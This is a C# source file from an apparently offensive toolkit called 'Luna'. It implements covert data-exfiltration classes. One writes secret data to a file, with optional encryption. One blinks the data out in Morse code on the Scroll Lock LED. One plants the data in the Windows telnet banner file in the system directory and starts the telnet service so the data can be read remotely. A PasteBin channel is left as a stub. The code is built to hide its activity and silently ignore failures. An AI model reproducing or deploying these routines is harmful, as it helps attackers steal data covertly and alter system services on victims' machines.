//Copyright(C) 2016  saintcrossbow@gmail.com

//This program is free software: you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program.If not, see<http://www.gnu.org/licenses/>
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;

namespace Luna
{
    // Simple file exfiltration: try to write to a file as specified in mission parameters. Any issues writing the file causes it to abort and
    // forget exfiltration. Goal is to keep covert before data exfiltrate.
    public class FileExfiltrate : Luna.CovertActions.IExfiltrate
    {
        string _secretData = "";
        string _targetFile = "";
        string _encryptKey = "";

        public string secretData
        {
            get { return _secretData; }

            set { _secretData = value; }
        }

        // For this class, we have to specify a target file to write the data
        public string targetFile
        {
            get { return _targetFile; }

            set { _targetFile = value; }
        }

        // Also can encrypt the output. No key means no encryption.
        public string encyptKey
        {
            get { return _encryptKey; }

            set { _encryptKey = value; }
        }
             
        public void exfiltrateData()
        {
            try
            {
                // Only attempt if we have a file and we have something useful to report
                if (!string.IsNullOrWhiteSpace(_targetFile) && !string.IsNullOrWhiteSpace(_secretData))        
                {
                    // Write to either encrypted file (if password is set) or plaintext
                    if (!string.IsNullOrWhiteSpace(encyptKey))
                        Luna.Crypto.EncryptFile(_secretData, _targetFile, _encryptKey);
                    else
                        File.WriteAllText(@_targetFile, _secretData);
                }
            }
            catch 
            {
                // Do nothing if cannot write
            }
        }
    }

    // A really silly way of exfiltrating done entirely for fun
    public class MorseExfiltrate : Luna.CovertActions.IExfiltrate
    {
        string _secretData = "";

        public string secretData
        {
            get { return _secretData; }

            set { _secretData = value; }
        }

        public void exfiltrateData()
        {
            try
            {
                ScrollLockMorse.SendMessage(_secretData);                
            }
            catch
            {
                // If morse fails, just fall through
            }
        }

        public string targetFile
        {
            get { return null; }

            set { }
        }

        public string encyptKey
        {
            get { return null; }

            set {  }
        }
             
    }

    // With the telnet banner, we are going to be super careful to not change anything other than the top of the
    // the banner itself. Any issues, like we can't find the file or directory, we will abort the exfiltrate.
    // Should not be used if not an admin
    public class TelnetBannerExfiltrate : Luna.CovertActions.IExfiltrate
    {
        string _secretData = "";
        const string TELNET_BANNER_FILE = "login.cmd";
        const string TELNET_START_SERVICE = "net start telnet";

        public string secretData
        {
            get { return _secretData; }

            set { _secretData = value; }
        }

        public void exfiltrateData()
        {
            try
            {
                string targetFile = Path.Combine(Environment.SystemDirectory, TELNET_BANNER_FILE);
                LunaGeneral.insertText(targetFile, _secretData);
                LunaGeneral.startCommand(TELNET_START_SERVICE);
            }
            catch
            {
                // If fails, just fall through
            }
        }

        public string targetFile
        {
            get { return null; }

            set { }
        }

        public string encyptKey
        {
            get { return null; }

            set { }
        }
    }

    // Need to link up PasteBin API
    public class PasteBinExfiltrate : Luna.CovertActions.IExfiltrate
    {
        string _secretData = "";

        public string secretData
        {
            get { return _secretData; }

            set { _secretData = value; }
        }

        public void exfiltrateData()
        {
            try
            {
                // TODO
            }
            catch
            {
                // If fails, just fall through
            }
        }

        public string targetFile
        {
            get { return null; }

            set { }
        }

        public string encyptKey
        {
            get { return null; }

            set { }
        }
    }

}
